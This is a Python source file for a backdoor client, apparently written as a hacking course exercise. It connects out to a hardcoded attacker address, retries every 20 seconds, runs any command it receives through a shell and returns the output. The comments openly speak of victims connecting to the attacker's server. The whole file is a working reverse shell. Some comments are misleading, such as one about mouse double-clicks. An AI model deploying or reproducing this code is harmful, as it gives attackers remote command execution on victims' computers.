##!/usr/bin/python
import socket
import subprocess
import json
# To allow pausing of our program
import time

# Global variables
sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
IP_ADDRESS = '192.168.31.138'
port = 54321

# Passing 'data' as arg
def reliable_send(data):
    json_data = json.dumps(data)
    # To allow us sending as much commands & inputs as possible
    sock.send(json_data.encode())

def reliable_recv():
    # Preparing to store json_data as bytes
    # Theory reference 
    # IP Fragmentation illustration
    # https://users.cs.fiu.edu/~esj/cgs4285/class11.html#:~:text=1.,on%20a%208%20byte%20boundary.
    # Why IP fragmentation HEADER must be 8 bytes
    # while the 2nd portion of it need NOT be 8 bytes
    # https://stackoverflow.com/questions/7846442/why-the-ip-fragments-must-be-in-multiples-of-8-bytes
    json_data = b''
    # To allow us run Backdoor until out of bytes
    # Instead of just 1024 bytes
    while True:
        try:
            json_data += sock.recv(1024)
            # If target.recv <= 1024 bytes
            return json.loads(json_data.decode())
            
        except ValueError:
            # If we get ValueError
            # Will go over reliable_recv() over & over
            continue

# Attempt to force a re-connection every 20 seconds
# Listen to mouse movement double-clicks to re-connect
def connection():
    while True:
        # Our Backdoor will sleep for 20 seconds
        # then it will perform next operation
        time.sleep(20)
        try:
            # Connecting to Backdoor Server
            sock.connect((IP_ADDRESS, port))
            # Enter our Shell
            shell()
        except Exception as e:
            # Recursion to perform recursive connections
            # A func calling itself as a func :D
            #
            # This will make victims actively connect to our Backdoor server
            # Even the attacker does NOT setup the server 
            # As soon as the Backdoor server is setup,
            # the victims will connect to Backdoor Server proactively
            connection()
            
def shell():
    while True:
        #command = sock.recv(1024)
        command = reliable_recv()
        #print(command.decode())

        #if message.decode() == 'q':
        if command.strip() == 'q':
            break
            # continue to sock.close()
        else:
            try:
                #message_back = input(f'Type Message to send to Server: ')
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = proc.stdout.read() + proc.stderr.read()
                #sock.send(result)
                reliable_send(result.decode())
                #sock.send(message_back.encode())
            except Exception as e:
                error_message = f'[!!] Cannot Execute this command: {str(e)}'
                reliable_send(error_message)

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# ==========================================
# IP_ADDRESS = '192.168.31.138'
# port = 54321
#sock.connect((IP_ADDRESS, port))
#print(f'Connection Established to Server!')
#shell()
# ==========================================
connection()
#answer = "Server: Hello Back!"
#sock.send(answer.encode())
sock.close()
